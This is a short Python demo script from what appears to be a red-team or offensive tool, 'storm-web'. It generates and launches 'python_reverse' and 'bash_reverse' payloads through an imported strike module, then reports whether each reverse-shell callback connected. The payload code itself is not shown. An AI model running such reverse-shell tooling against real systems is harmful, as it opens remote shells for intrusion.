#!/usr/bin/env python3
"""P14.5 strike demo -- generate -> launch -> VERIFY callback, no copy-paste.

Run: python3 scripts/demo_strike.py
"""
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "storm-web"))

from app.exec.strike import launch_payload  # noqa: E402

print("== STRIKE: generate -> launch -> verify ==")
for ptype in ("python_reverse", "bash_reverse"):
    s = launch_payload(ptype, timeout=4.0)
    print("\n[%s]" % ptype)
    print("  artifact :", s.generated.get("filename", "<code>"))
    print("  target   :", s.target)
    print("  exec     : exit=%s timed_out=%s" % (s.exec.exit_code, s.exec.timed_out))
    print("  callback :", "VERIFIED" if s.callback.ok else "NO CONNECTION")
    print("  verdict  :", s.summary())
